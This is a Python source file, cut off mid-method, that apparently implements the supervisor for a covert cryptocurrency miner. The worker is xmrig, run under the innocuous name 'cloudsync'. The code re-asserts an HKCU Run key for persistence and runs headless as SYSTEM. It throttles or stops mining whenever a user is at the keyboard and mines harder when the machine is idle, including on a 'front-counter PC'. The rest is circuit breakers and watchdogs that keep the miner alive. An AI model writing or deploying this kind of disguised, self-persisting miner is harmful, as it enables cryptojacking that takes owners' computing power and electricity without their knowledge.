"""The reconcile loop: desired state vs. reality, circuit breakers, runtime.

``Supervisor.tick(now)`` is one pure-ish step.  It never sleeps, never reads the
wall clock behind the caller's back (``now`` is injected, only used as a
fallback), and returns the list of actions it decided - which is what the unit
tests assert on.  ``main()`` is the composition root: mutex, settings, updater
scheduling, kill switch and the real 3 s loop around ``tick``.

Desired state
-------------
The controller only mines on mains power.  A present user is handled two ways,
exactly like the old code:

* when a job object exists (``job_ok``) the worker keeps running and the job's
  CPU rate is capped at 25 % after a 60 s dwell - no restart, the OpenCL context
  is never torn down;
* without a job object the supervisor uses the restart-based ``full``/``trickle``
  profile switch, and when the user is present the worker is stopped outright
  (the original "two independent idle gates").

Circuit breakers
----------------
``closed`` -- normal.
``gpu_open`` -- 2 fast crashes (lived < 30 s): the GPU block is dropped for every
subsequent start and the worker retries CPU-only.
``open`` -- 6 fast crashes: no start for 15 minutes, all attempts suppressed.
``half_open`` -- the 15 minutes elapsed: exactly one probe start is allowed; if
it is another fast crash the breaker re-opens.

A worker that stays alive for ``stable_seconds`` resets the counters to
``closed`` (the GPU block stays dropped until the next real restart, matching the
controller's behaviour).  ``stable_seconds`` alone is not enough: the worker must
also show telemetry/log progress, so a wedged worker cannot reset its own count.
A stale-telemetry restart counts in a supervisor-owned stale-failure counter (it
cannot live on the worker: ``Worker.reap()`` zeroes the crash counter as soon as
a long-lived worker exits), and the breaker sees
``max(crash failures, stale failures)`` so repeated wedges trip the same
GPU-drop/quiet breakers as repeated crashes.
"""

from __future__ import annotations

import os
import time

from . import lifecycle
from .config.profiles import (PROFILES, choose_profile, get_profile,
                              load_gpu_profile)
from .config.settings import DEFAULT_IDLE_SECONDS
from .core.clock import (idle_seconds, interactive_idle_seconds, on_battery,
                         session_id)
from .core.diagnostics import UNKNOWN, classify
from .core.state import build_payload, write as write_state

#: Stable logger name for this module: every line it emits is prefixed with it.
LOGGER_NAME = "cloudsync.supervisor"

__all__ = [
    "LOGGER_NAME",
    "TICK",
    "ACTIVE_PCT",
    "ACTIVE_DWELL",
    "MIN_PROFILE_DWELL",
    "STATE_INTERVAL",
    "QUIET_SECONDS",
    "SESSION0_IDLE_TTL",
    "GPU_DROP_AFTER",
    "QUIET_AFTER",
    "STABLE_SECONDS",
    "STALE_TELEMETRY_SECONDS",
    "STOP_RETRY_SECONDS",
    "Supervisor",
    "user_active",
    "main",
]

# ---- tunables (overridable from the constructor) ---------------------------
TICK = 3                     # supervisor loop seconds
ACTIVE_PCT = 25              # CPU ceiling while the user is at the keyboard
ACTIVE_DWELL = 60            # only throttle after this long of continuous input
MIN_PROFILE_DWELL = 120      # minimum seconds between profile switches
STATE_INTERVAL = 30          # state.json heartbeat
SESSION0_IDLE_TTL = 10.0     # cache window for the cross-session idle probe
QUIET_SECONDS = 900          # circuit-breaker open period (= 15 min)
GPU_DROP_AFTER = 2           # fast crashes before the GPU block is dropped
QUIET_AFTER = 6              # fast crashes before the quiet period
STABLE_SECONDS = 300.0       # alive this long -> counters reset
STALE_TELEMETRY_SECONDS = 900  # no accepted/speed progress -> worker is hung
STOP_DWELL = 3.0             # keep a fresh worker up this long before stopping
STOP_RETRY_SECONDS = 60.0    # after a failed stop, wait this long before retrying
SWEEP_INTERVAL = 300.0       # orphan sweep cadence
RUN_KEY_INTERVAL = 600.0     # HKCU Run key check cadence


def user_active(idle_threshold=DEFAULT_IDLE_SECONDS):
    """True when the user is at the keyboard (module-level so tests can patch)."""
    try:
        return float(idle_seconds()) < float(idle_threshold)
    except Exception:
        return False


def _gpu_profile_ok(settings):
    """True when ``gpu_profile.json`` exists *and* loads as a valid profile.

    ``os.path.isfile`` alone treated a truncated or garbage probe as present, so
    the regeneration probe never ran and the worker stayed CPU-only forever; a
    corrupt file is now the same case as a missing one.
    """
    try:
        path = settings.path("gpu_profile.json")
    except Exception:
        return False
    return load_gpu_profile(path) is not None


# ---------------------------------------------------------------------------
# Supervisor
# ---------------------------------------------------------------------------


class Supervisor:
    """Reconcile loop for one worker.

    Every dependency the tests need to control is a keyword argument: ``worker``
    (an already-built worker, real or fake), ``worker_factory`` (called with the
    settings when ``worker`` is omitted), ``settings``, ``profiles``, ``clock``,
    ``idle_provider``, ``power_provider``, ``session_idle_provider`` (the
    cross-session idle probe used in session 0, with ``session0_idle_ttl`` as
    its cache window), ``state_path``/``state_writer``, ``logger`` and the
    optional ``sweep``/``run_key``/``awake`` hooks.
    """

    def __init__(self, settings=None, worker=None, *,
                 worker_factory=None,
                 profiles=None,
                 clock=None,
                 idle_provider=None,
                 power_provider=None,
                 session_idle_provider=None,
                 session0_idle_ttl=SESSION0_IDLE_TTL,
                 state_path=None,
                 state_writer=None,
                 logger=None,
                 stop_dwell=STOP_DWELL,
                 profile_dwell=MIN_PROFILE_DWELL,
                 active_pct=ACTIVE_PCT,
                 active_dwell=ACTIVE_DWELL,
                 state_interval=STATE_INTERVAL,
                 quiet_seconds=QUIET_SECONDS,
                 gpu_drop_after=GPU_DROP_AFTER,
                 quiet_after=QUIET_AFTER,
                 stable_seconds=STABLE_SECONDS,
                 sweep=None,
                 sweep_interval=SWEEP_INTERVAL,
                 run_key=None,
                 run_key_interval=RUN_KEY_INTERVAL,
                 awake=None,
                 tick_seconds=TICK):
        self.settings = settings
        self.profiles = profiles or PROFILES
        self._clock = clock or time.time
        self._idle_provider = idle_provider
        self._power_provider = power_provider
        self._session_idle_provider = session_idle_provider
        self._session0_idle_cache = None     # (expires_at, float|None)
        self._state_path = state_path
        self._state_writer = state_writer
        self._raw_log = _normalise_logger(logger)
        self._log = _named_writer(self._raw_log)
        self._sweep = sweep
        self._run_key = run_key
        self._awake = awake

        self.stop_dwell = float(stop_dwell)
        self.profile_dwell = float(profile_dwell)
        self.active_pct = int(active_pct)
        self.active_dwell = float(active_dwell)
        self.state_interval = float(state_interval)
        self.session0_idle_ttl = float(session0_idle_ttl)
        self.quiet_seconds = float(quiet_seconds)
        self.gpu_drop_after = int(gpu_drop_after)
        self.quiet_after = int(quiet_after)
        self.stable_seconds = float(stable_seconds)
        self.sweep_interval = float(sweep_interval)
        self.run_key_interval = float(run_key_interval)
        self.tick_seconds = float(tick_seconds)

        # Session 0 = the non-interactive services session (headless boot task
        # running as SYSTEM). GetLastInputInfo cannot report a user there, so the
        # gate asks the WTS session table instead (_session0_idle); when that
        # answers, a real user throttles the worker and an empty PC runs max.
        try:
            self._session0 = (session_id() == 0)
        except Exception:
            self._session0 = False
        if self._session0:
            self._log("session 0 detected - idle gate uses cross-session input")

        self.worker = self._resolve_worker(worker, worker_factory)

        # --- observable state (also what state.json publishes) ------------
        self.idle = 0.0
        self.wanted = False
        self.profile = "full"
        self.cpu_cap_pct = 100
        self.throttled = False
        self.breaker = "closed"       # closed | gpu_open | open | half_open
        self.use_gpu = True
        self.fast_failures = 0        # crash counter (mirrors worker.fast_failures)
        self.stale_failures = 0       # stale-restart counter, supervisor-owned
        self.quiet_until = 0.0
        self.last_actions = []

        # --- private timers -----------------------------------------------
        self._started_at = 0.0
        self._last_tick_at = None     # previous tick clock, for suspend/jump detection
        self._last_state = 0.0
        self._last_sweep = 0.0
        self._last_run_key = 0.0
        self._active_since = 0.0
        self._was_alive = False
        self._handled_failures = 0
        self._stop_retry_at = 0.0
        # Stale-telemetry liveness (2026-11-24 field failure): a worker can be
        # alive but wedged - no new shares, no hashrate movement - while
        # state.json keeps republishing the last good numbers. Track the last
        # tick that actually brought progress, armed only once telemetry was
        # actually observed (a start-time seed wrongly aged into staleness for
        # workers whose log never parses).
        self._last_telemetry_progress = 0.0
        self._last_accepted = None
        self._last_speed = None
        self._telemetry_armed = False
        # Second, cheap signal for "no parsable telemetry at all": the worker log
        # must still be growing (a healthy xmrig writes within seconds). When the
        # log path cannot be resolved the signal is unavailable and stale
        # detection falls back to telemetry alone; that is logged exactly once.
        self._last_log_growth = 0.0
        self._log_baseline_size = None
        self._log_signal_unavailable_logged = False

    # -- construction ------------------------------------------------------

    def _resolve_worker(self, worker, worker_factory):
        if worker is not None:
            return worker
        if worker_factory is not None:
            # The tests inject the fake worker under any *worker* parameter name,
            # so accept an instance as well as a factory.
            if hasattr(worker_factory, "alive"):
                return worker_factory
            return worker_factory(self.settings)
        if self.settings is None:
            raise TypeError("Supervisor needs a worker or settings")
        from .miner.worker import Worker
        return Worker(self.settings)

    @property
    def idle_threshold(self):
        """Seconds of idle time required before the idle gate opens."""
        value = getattr(self.settings, "idle_seconds", None)
        if value is None:
            value = getattr(self.settings, "idle", DEFAULT_IDLE_SECONDS)
        try:
            return float(value)
        except (TypeError, ValueError):
            return float(DEFAULT_IDLE_SECONDS)

    def __repr__(self):
        return "Supervisor(breaker=%r, profile=%r, wanted=%s, alive=%s)" % (
            self.breaker, self.profile, self.wanted, self.worker.alive())

    def _debug(self, message):
        """Low-volume diagnostic line; still carries the module name prefix."""
        self._log("debug: %s" % message)

    # -- inputs (patchable / injectable) ------------------------------------

    def _now(self, now):
        if now is not None:
            return float(now)
        try:
            return float(self._clock())
        except Exception:
            return time.time()

    def _read_idle(self):
        if self._idle_provider is not None:
            try:
                return float(self._idle_provider())
            except Exception:
                return 0.0
        try:
            return float(idle_seconds())
        except Exception:
            return 0.0

    def _read_mains(self):
        if self._power_provider is not None:
            try:
                return bool(self._power_provider())
            except Exception:
                return True
        try:
            return not bool(on_battery())
        except Exception:
            return True

    def _session0_idle(self):
        """Cross-session user idle in seconds, or ``None`` when unknown.

        In session 0 ``GetLastInputInfo`` only sees the services session, so it
        reports 0 (or garbage) and the gate would treat a busy front-counter PC
        as "away" all day. :func:`core.clock.interactive_idle_seconds` asks the
        WTS session table instead. The answer is cached for
        ``session0_idle_ttl`` seconds (10 s by default): a tick runs every few
        seconds and enumerating sessions plus WTSINFO on every tick is wasteful,
        while a 10 s stale answer is irrelevant to a 180 s threshold.

        ``None`` means "probe unavailable/failed/no interactive session"; the
        three call sites then keep the historical forced-away behaviour.
        """
        if not getattr(self, "_session0", False):
            return None
        now = self._now(None)
        cached = self._session0_idle_cache
        if cached is not None and now < cached[0]:
            return cached[1]
        value = None
        try:
            if self._session_idle_provider is not None:
                value = self._session_idle_provider()
            else:
                value = interactive_idle_seconds()
        except Exception:
            value = None
        if value is not None:
            try:
                value = float(value)
            except (TypeError, ValueError):
                value = None
            if value is not None and value < 0.0:
                value = None
        self._session0_idle_cache = (now + self.session0_idle_ttl, value)
        return value

    def _decision_idle(self, idle):
        """Idle value used for profile/cap decisions.

        Session 0 uses the cross-session probe when it answered, so a real user
        at the keyboard throttles the worker exactly like an in-session user.
        When the probe is unavailable the machine is still treated as "away" (at
        least one second past the idle threshold): that is the previous
        behaviour and it keeps a headless box mining.
        """
        cross = self._session0_idle()
        if cross is not None:
            return cross
        if not getattr(self, "_session0", False):
            return idle
        try:
            threshold = float(self.idle_threshold)
        except (TypeError, ValueError):
            threshold = float(DEFAULT_IDLE_SECONDS)
        return max(threshold + 1.0, float(idle))

    def _read_user_active(self, idle):
        cross = self._session0_idle()
        if cross is not None:
            # A real user in another session: same rule as the local probe.
            return cross < self.idle_threshold
        if getattr(self, "_session0", False):
            # No interactive desktop exists to be active on (probe unavailable).
            return False
        threshold = self.idle_threshold
        try:
            return bool(user_active(threshold))
        except TypeError:
            return idle < threshold
        except Exception:
            return idle < threshold

    def _gpu_profile_opencl(self):
        """True when the installed ``gpu_profile.json`` enables OpenCL."""
        try:
            path = self.settings.path("gpu_profile.json")
        except Exception:
            return False
        profile = load_gpu_profile(path)
        if not isinstance(profile, dict):
            return False
        opencl = profile.get("opencl")
        return bool(isinstance(opencl, dict) and opencl.get("enabled"))

    def _select_profile(self, idle, active):
        cross = self._session0_idle()
        if getattr(self, "_session0", False) and "max" in self.profiles:
            if cross is None or cross >= self.idle_threshold:
                # Away and headless: use every thread. The GPU variant is only
                # safe when the probe actually enabled OpenCL; otherwise stay
                # CPU-only. This also covers the "probe unavailable" fallback.
                if "max-gpu" in self.profiles and self._gpu_profile_opencl():
                    return "max-gpu"
                return "max"
            # A real person is at an interactive session: decide from their
            # input exactly like the in-session path (trickle while they type).
            idle = cross
        try:
            name = choose_profile(idle, active, self.idle_threshold)
        except TypeError:
            name = choose_profile(idle, active)
        except Exception:
            name = "full"
        if name not in self.profiles:
            name = "full"
        return name

    # -- circuit breaker ----------------------------------------------------

    def _sync_breakers(self, now, actions, source=None):
        """React to the effective failure count (crash vs. stale, whichever is higher).

        Stale restarts are counted by the supervisor, not on the worker, because
        ``Worker.reap()`` zeroes its own counter when a long-lived worker exits -
        exactly the wedged-worker case.  The breaker therefore uses
        ``max(crash_failures, stale_failures)`` and labels the action with the
        kind of failure that actually drove it.
        """
        effective = max(int(self.fast_failures), int(self.stale_failures))
        if effective < self._handled_failures:
            self._handled_failures = effective
            return
        if effective <= self._handled_failures:
            return
        self._handled_failures = effective

        if source == "stale" and self.fast_failures > self.stale_failures:
            source = "crash"
        if source is None:
            source = ("stale" if self.stale_failures >= self.fast_failures
                      and self.stale_failures else "crash")
        kind = "stale failures" if source == "stale" else "fast crashes"

        if effective >= self.quiet_after:
            if self.breaker != "open" or self.quiet_until <= now:
                self.breaker = "open"
                self.quiet_until = now + self.quiet_seconds
                actions.append("quiet")
                self._log("circuit breaker OPEN: %d %s -> %ds quiet"
                          % (effective, kind, int(self.quiet_seconds)))
            return

        if effective >= self.gpu_drop_after and self.use_gpu:
            self.use_gpu = False
            if self.breaker == "closed":
                self.breaker = "gpu_open"
            try:
                self.worker.use_gpu = False
            except Exception:
                pass
            actions.append("gpu-dropped")
            self._log("GPU circuit-breaker: retrying CPU-only after %d %s"
                      % (effective, kind))

    def _quiet_blocks(self, now, actions):
        """True when the quiet period suppresses starts this tick."""
        if self.breaker != "open":
            return False
        if now >= self.quiet_until:
            self.breaker = "half_open"
            self.quiet_until = 0.0
            actions.append("probe")
            self._log("quiet period over - allowing one probe start")
            return False
        actions.append("quiet")
        return True

    def _maybe_recover(self, now, actions):
        if self.breaker == "closed" and not self.fast_failures and \
                not self.stale_failures:
            return
        try:
            alive = self.worker.alive()
            uptime = float(self.worker.uptime()) if alive else 0.0
        except Exception:
            return
        # Uptime alone is not health: a wedged worker is alive forever, so this
        # used to clear the counter a stale restart had just earned and the
        # breaker could never open. Recovery needs progress observed after the
        # stability window as well. This is the ONLY place the stale-failure
        # counter is cleared: not reap(), not a bare uptime.
        if alive and uptime >= self.stable_seconds and \
                self._stability_confirmed(now):
            self.fast_failures = 0
            self.stale_failures = 0
            self._handled_failures = 0
            # Both copies of the crash counter must be cleared together:
            # _detect_crash re-imports worker.fast_failures every tick and
            # Worker.reap() leaves 1-2 behind on a live worker, so zeroing only
            # the supervisor copy made "recovered"/"breaker closed" fire every
            # tick and instantly re-dropped the GPU restored below.
            if hasattr(self.worker, "fast_failures"):
                try:
                    self.worker.fast_failures = 0
                except Exception:
                    pass
            self.breaker = "closed"
            self.quiet_until = 0.0
            self._restore_profile_gpu()
            actions.append("recovered")
            self._log("worker stable for %.0fs - circuit breaker closed" % uptime)

    def _restore_profile_gpu(self):
        """Re-arm the GPU after confirmed recovery, per the active profile.

        A dropped GPU block used to be permanent: one recoverable pool outage
        left ``use_gpu`` False for the life of the controller, so the box mined
        CPU-only until the controller restarted.  The worker's copy is restored
        too because that is the flag ``Worker.start()`` feeds into the config
        builder.
        """
        try:
            target = bool(get_profile(self.profile).gpu)
        except Exception:
            target = True
        self.use_gpu = target
        try:
            self.worker.use_gpu = target
        except Exception:
            pass
        self._log("profile %r: use_gpu restored to %s" % (self.profile, target))

    def _stability_confirmed(self, now):
        """Proof that a long-lived worker is productive, not merely alive.

        Uses the same two liveness signals as :meth:`_check_stale_telemetry`:
        the progress signature once armed, else worker-log growth.  The
        evidence must be *fresh* and must post-date the stability window, so a
        worker that started, reported once and then wedged cannot reset the
        crash counter.  A duck-typed worker with no telemetry reader keeps the
        historical uptime-only behaviour.
        """
        if not self._has_telemetry_reader():
            return True
        stable = self.stable_seconds
        if self._telemetry_armed:
            last = self._last_telemetry_progress
        else:
            if self._worker_log_size() is None:
                # No log-growth fallback: there is no evidence of progress, and
                # bare uptime must not clear the failure counters.
                return False
            last = self._last_log_growth
        return bool((now - last) < stable and last >= self._started_at + stable)

    def _detect_crash(self, now, actions):
        reap = getattr(self.worker, "reap", None)
        if callable(reap):
            try:
                reap()
            except Exception as exc:
                self._log("worker reap failed [%s]: %r"
                          % (_owner_tag(exc, "worker"), exc))

        try:
            alive = self.worker.alive()
        except Exception:
            alive = False

        if self._was_alive and not alive:
            actions.append("crash")
            if not hasattr(self.worker, "fast_failures"):
                self.fast_failures += 1

        if hasattr(self.worker, "fast_failures"):
            try:
                self.fast_failures = int(self.worker.fast_failures)
            except (TypeError, ValueError):
                pass
        self._sync_breakers(now, actions)

    # -- worker actions -----------------------------------------------------

    def _start_worker(self, now, profile, actions):
        try:
            started = self.worker.start(profile, gpu=self.use_gpu)
        except TypeError:
            try:
                started = self.worker.start(profile)
            except Exception as exc:
                self._log("worker start failed [%s]: %r" % (_owner_tag(exc, "worker"), exc))
                actions.append("start-failed")
                return False
        except Exception as exc:
            self._log("worker start failed [%s]: %r" % (_owner_tag(exc, "worker"), exc))
            actions.append("start-failed")
            return False
        if started is False:
            actions.append("start-failed")
            self._log("worker did not start")
            return False
        self._started_at = now
        self._active_since = 0.0
        self._was_alive = True
        self._stop_retry_at = 0.0
        # A just-(re)started worker has not had a chance to report anything yet:
        # give it a full stale window and forget the previous process's signature.
        self._reset_telemetry_baseline(now)
        # A fresh process starts unthrottled: the old cap belonged to the dead
        # worker, so a restart must not keep advertising 25 % in state.json.
        self.cpu_cap_pct = 100
        self.throttled = False
        try:
            self.worker.throttled = False
        except Exception:
            pass
        actions.append("start")
        return True

    def _stop_worker(self, now, actions):
        """Stop the worker; keep tracking it when the kill is unconfirmed.

        ``Worker.stop()`` now reports whether the process is actually gone.  A
        swallowed taskkill used to clear ``proc`` anyway, so the next tick saw
        ``alive() == False`` and spawned a second miner from the same install.
        A failed stop keeps the worker entry (timers/counters untouched) and
        reports ``stop-failed``; the reconcile path will not spawn a replacement
        while the old process is still alive.  Because the entry is kept, every
        tick would otherwise re-run the blocking stop (20+10+8+5 s waits) and
        stall the 3 s loop, so a failed stop is only retried every
        ``STOP_RETRY_SECONDS``.
        """
        if now is not None and now < self._stop_retry_at:
            actions.append("stop-backoff")
            return False
        stop = getattr(self.worker, "stop", None)
        stopped = True
        if callable(stop):
            try:
                result = stop()
                if result is not None:
                    stopped = bool(result)
            except Exception as exc:
                self._log("worker stop failed [%s]: %r"
                          % (_owner_tag(exc, "worker"), exc))
                stopped = False
        if not stopped:
            self._stop_retry_at = float(now) + STOP_RETRY_SECONDS
            self._log("worker stop did not confirm exit - keeping worker entry; "
                      "retrying in %ds" % int(STOP_RETRY_SECONDS))
            actions.append("stop-failed")
            return False
        self._stop_retry_at = 0.0
        self._started_at = 0.0
        self._was_alive = False
        self._active_since = 0.0
        self.cpu_cap_pct = 100
        self.throttled = False
        # The crash counter and the breaker are owned by _sync_breakers: a
        # deliberate stop must NOT clear them, or a crash -> stop -> crash cycle
        # never reaches the quiet period (crash and stop are indistinguishable
        # from the counter's point of view once the worker is gone).
        try:
            self.worker.throttled = False
        except Exception:
            pass
        actions.append("stop")
        return True

    def _switch_worker(self, now, profile, actions):
        switch = getattr(self.worker, "switch", None)
        if not callable(switch):
            actions.append("switch-failed")
            return False
        try:
            switched = switch(profile)
        except Exception as exc:
            self._log("profile switch failed [%s]: %r"
                      % (_owner_tag(exc, "worker"), exc))
            actions.append("switch-failed")
            return False
        if switched is False:
            actions.append("switch-failed")
            return False
        self.profile = profile
        self._started_at = now
        # switch() restarts the process; the old telemetry signature/clock
        # belonged to the previous process. Without this a profile switch just
        # before the stale window expired killed the fresh worker next tick.
        self._reset_telemetry_baseline(now)
        actions.append("switch:%s" % profile)
        return True

    def _apply_cap(self, now, idle, actions):
        # _decision_idle resolves the session-0 case: the cross-session probe
        # when it answered, "away" when it did not.
        idle = self._decision_idle(idle)
        if idle >= self.idle_threshold:
            self._active_since = 0.0
            # away ceiling is 75%, not 100%: leave headroom on unstable hardware
            # (WHEA 0x124 hangs when the miner saturates all 24 threads)
            cap = 75
        else:
            if not self._active_since:
                self._active_since = now
            cap = self.active_pct if (now - self._active_since) >= self.active_dwell else 100
        if cap == self.cpu_cap_pct:
            return
        setter = getattr(self.worker, "set_cpu_rate", None)
        applied = False
        if callable(setter):
            try:
                applied = bool(setter(cap))
            except Exception:
                applied = False
        if not applied:
            return
        self.cpu_cap_pct = cap
        self.throttled = cap < 100
        try:
            self.worker.throttled = self.throttled
        except Exception:
            pass
        actions.append("cap:%d" % cap)
        self._log("cpu cap -> %d%% (idle %.0fs)" % (cap, idle))

    # -- state / hooks ------------------------------------------------------

    def build_state(self):
        """Build the state.json payload for this tick (pure, no write).

        Telemetry read by :meth:`_read_telemetry` is published here through
        ``build_payload``: ``hashrate``/``accepted``/``rejected``/``gpu_ready``
        (TEST-REPORT D2).
        """
        return build_payload(self.settings, self.worker, self.wanted,
                             self.idle, self.cpu_cap_pct)

    def _write_payload(self, payload):
        if self._state_writer is not None:
            try:
                self._state_writer(payload)
                return True
            except Exception as exc:
                self._log("state write failed [%s]: %r"
                          % (_owner_tag(exc, "state"), exc))
                return False
        if not self._state_path:
            return False
        try:
            write_state(self._state_path, payload)
            return True
        except Exception as exc:
            self._log("state write failed [%s]: %r"
                      % (_owner_tag(exc, "state"), exc))
            return False

    def _ensure_run_key(self):
        """Re-assert the HKCU Run value every ``RUN_KEY_INTERVAL`` (MIGRATION G3).

        The composition root injects ``lifecycle.ensure_run_key`` as the
        ``run_key`` hook; a supervisor built without one falls back to the
        lifecycle helper for a real install (``install.json`` present).  The
        outcome is debug-logged and a failure never aborts the tick.
        """
        try:
            if self._run_key is not None:
                outcome = self._run_key()
            elif self.settings is not None and os.path.isfile(
                    self.settings.path("install.json")):
                writer = _named_writer(self._raw_log, "cloudsync.lifecycle")
                outcome = lifecycle.ensure_run_key(self.settings, writer)
            else:
                self._debug("run key check skipped: no install.json")
                return False
        except Exception as exc:
            self._debug("run key check failed [%s]: %r"
                        % (_owner_tag(exc, "run_key"), exc))
            return False
        self._debug("run key check: ok=%s" % bool(outcome))
        return bool(outcome)

    def _telemetry_signature(self):
        """Progress signature ``(accepted, speed)``, or ``None`` when unreadable.

        A wedged-but-alive worker keeps re-reporting the last parsed values, so
        an unchanged signature across ticks means no new work is being done.
        ``None`` covers "no telemetry source / nothing parsed yet", which must
        not count as progress in either direction.
        """
        try:
            tele = getattr(self.worker, "tele", None)
        except Exception:
            return None
        if not isinstance(tele, dict):
            return None
        accepted = tele.get("accepted")
        speed = tele.get("speed_10s")
        if speed is None:
            speed = tele.get("speed_60s")
        if speed is None:
            speed = tele.get("speed_15m")
        if speed is None:
            speed = tele.get("speed")
        if speed is None:
            speed = tele.get("hashrate")
        if accepted is None and speed is None:
            return None
        return (accepted, speed)

    def _has_telemetry_reader(self):
        """True when the worker exposes the telemetry plumbing."""
        return callable(getattr(self.worker, "read_telemetry", None))

    def _worker_log_size(self):
        """Worker log size in bytes, or ``None`` when the signal is unavailable.

        A missing log file must NOT read as "0 bytes and not growing": a healthy
        worker whose log path is wrong, not created yet, or in a missing install
        directory would be judged stale every 900 s and restarted forever (GPU
        dropped after two windows, quiet period after six). ``None`` therefore
        means "fallback unavailable": the log-growth signal is disabled and the
        primary telemetry signal decides. Only a file that exists and whose size
        does not change is true-zero stale evidence.
        """
        size = None
        if self.settings is not None:
            try:
                from .miner.worker import WORKER_LOG_NAME
                path = self.settings.path(WORKER_LOG_NAME)
                size = int(os.path.getsize(path))
            except Exception:
                size = None
        if size is None:
            self._note_log_signal_unavailable()
        return size

    def _note_log_signal_unavailable(self):
        """Log the disabled log-growth fallback once per supervisor lifetime."""
        if self._log_signal_unavailable_logged:
            return
        self._log_signal_unavailable_logged = True
        self._log("worker-log growth signal unavailable - stale detection "
                  "uses telemetry only")

    def _reset_telemetry_baseline(self, now):
        """Start a fresh stale window: shared by ``_start_worker``/``_switch_worker``.

        A restarted process must not inherit the previous process's progress
        clock or signature, or a profile switch just before the window expired
        kills the new worker on the next tick.
        """
        self._last_telemetry_progress = 0.0
        self._last_accepted = None
        self._last_speed = None
        self._telemetry_armed = False
        self._last_log_growth = float(now)
        self._log_baseline_size = self._worker_log_size()

    def _note_telemetry_progress(self, now):
        """Arm the stale clock on the first signature, then track movement.

        The clock used to be seeded at start time, so a worker whose telemetry
        never parsed was judged stale 15 minutes after every start. Arming on
        the first observed signature means the window starts when telemetry
        actually exists; changed values keep it alive.
        """
        signature = self._telemetry_signature()
        if signature is None:
            return
        if not self._telemetry_armed:
            self._telemetry_armed = True
            self._last_telemetry_progress = float(now)
            self._last_accepted, self._last_speed = signature
            return
        if signature != (self._last_accepted, self._last_speed):
            self._last_telemetry_progress = float(now)
            self._last_accepted, self._last_speed = signature

    def _note_stale_failure(self, now, actions):
        """Count a stale restart in the supervisor-owned stale-failure counter.

        A wedged worker never exits, so neither ``Worker.reap()`` nor the crash
        path ever counts it; without this the supervisor would kill and respawn
        it every 15 minutes forever, recreating the GPU/OpenCL context while the
        breaker stayed closed. The counter lives on the supervisor because
        ``Worker.reap()`` zeroes ``worker.fast_failures`` when a long-lived worker
        exits - exactly the wedged-worker case. ``_sync_breakers`` uses
        ``max(crash_failures, stale_failures)``, so stale restarts drop the GPU
        at 2 and open the quiet window at 6 just like crashes; the counter is
        cleared only by :meth:`_maybe_recover` after a confirmed stable run.
        """
        self.stale_failures += 1
        self._log("stale failure %d/%d" % (self.stale_failures, self.quiet_after))
        self._sync_breakers(now, actions, source="stale")

    def _check_stale_telemetry(self, now, actions):
        """Restart a live worker whose telemetry has not moved for 15 minutes.

        Only a worker that is meant to run (``should_run`` upstream already
        respects mains/pause/quiet/breaker) and is still alive is judged: a dead
        worker is the crash path's job.

        Two signals:

        * primary - the progress signature armed on the first observation and
          refreshed on every change (a wedged worker re-reports old values);
        * secondary - a worker that never produced parsable telemetry at all
          and whose log file has not grown for the same window (a healthy xmrig
          writes speed/job lines within seconds).

        The restart is recorded in the supervisor-owned stale-failure counter
        *before* the process is stopped, so repeated wedges drive the same
        breaker as repeated crashes. The stop path is reused, a replacement is
        only spawned once the old PID is confirmed dead, and a failed kill is
        reported as ``stale-stop-failed`` rather than a successful restart (see
        :meth:`_stop_worker`).
        """
        try:
            alive = bool(self.worker.alive())
        except Exception:
            alive = False
        if not alive:
            return False

        elapsed = None
        if self._telemetry_armed:
            elapsed = now - self._last_telemetry_progress
        elif self._has_telemetry_reader():
            size = self._worker_log_size()
            if size is not None:
                if size != self._log_baseline_size:
                    self._log_baseline_size = size
                    self._last_log_growth = now
                elapsed = now - self._last_log_growth
        if elapsed is None or elapsed < STALE_TELEMETRY_SECONDS:
            return False

        self._log("worker telemetry stale for %ds - restarting worker"
                  % int(elapsed))
        # Reset before the kill attempt: one stale window fires exactly once,
        # even when the process cannot be killed and stays tracked.
        self._reset_telemetry_baseline(now)
        self._note_stale_failure(now, actions)
        if self._stop_worker(now, actions):
            actions.append("stale-restart")
        else:
            # The process is still alive, so nothing was restarted: telling the
            # truth here keeps the action log and telemetry from claiming a
            # restart that did not happen.
            actions.append("stale-stop-failed")
        return True

    def _read_telemetry(self, now=None):
        """Ingest this tick's worker telemetry (TEST-REPORT D2).

        The heartbeat used to publish ``hashrate: "n/a"`` forever because nothing
        called ``Worker.read_telemetry()``. Reading once per tick keeps
        ``build_state()`` current without waiting for the 30 s state cycle; the
        worker's source (a log-tail read) is cheap. A worker without the method
        (test doubles, future transports) or a failing source never aborts the
        tick. A successful read also feeds the stale-telemetry progress clock.
        """
        reader = getattr(self.worker, "read_telemetry", None)
        if not callable(reader):
            return False
        try:
            reader()
        except Exception as exc:
            self._debug("telemetry read failed [%s]: %r"
                        % (_owner_tag(exc, "telemetry"), exc))
            return False
        if now is not None:
            self._note_telemetry_progress(now)
        return True

    def _run_hooks(self, now, actions):
        if self._awake is not None:
            try:
                self._awake(bool(self.worker.alive() and self.wanted))
            except Exception:
                pass
        if self._sweep is not None and (now - self._last_sweep) >= self.sweep_interval:
            self._last_sweep = now
            try:
                keep = self.worker.pid if self.worker.alive() else None
            except Exception:
                keep = None
            try:
                self._sweep(keep)
            except TypeError:
                try:
                    self._sweep()
                except Exception:
                    pass
            except Exception:
                pass
        if (now - self._last_run_key) >= self.run_key_interval:
            self._last_run_key = now
            self._ensure_run_key()
        if (self._state_path or self._state_writer) and \
                (now - self._last_state) >= self.state_interval:
            self._last_state = now
            if self._write_payload(self.build_state()):
                actions.append("state")

    # -- the tick -----------------------------------------------------------

    def tick(self, now=None):
        """One reconcile step; returns the list of actions taken.

        ``now`` is the supervisor clock in seconds (tests pass a virtual value).
        No sleeping and no real mining: everything is decided from the injected
        worker, idle/power providers and timers.
        """
        now = self._now(now)
        previous_tick = self._last_tick_at
        self._last_tick_at = now
        actions = []

        # Resume after sleep/hibernate, an RTC reset or an NTP step: a tick gap
        # as large as the stale window makes the pre-suspend telemetry look
        # wedged, and treating that as staleness stopped and restarted a
        # perfectly healthy worker. A gap >= STALE_TELEMETRY_SECONDS is a resume:
        # re-baseline the liveness/log clocks and the stop-retry gate instead of
        # declaring staleness. The wall clock still stamps state/telemetry; only
        # the staleness comparison is resume-aware.
        if previous_tick is not None:
            gap = now - previous_tick
            if gap >= STALE_TELEMETRY_SECONDS:
                self._log("clock jump %ds, baseline reset" % int(gap))
                self._reset_telemetry_baseline(now)
                self._stop_retry_at = 0.0

        self._detect_crash(now, actions)

        idle = self._read_idle()
        self.idle = idle
        mains = self._read_mains()
        self.wanted = bool(mains)
        active = self._read_user_active(idle)
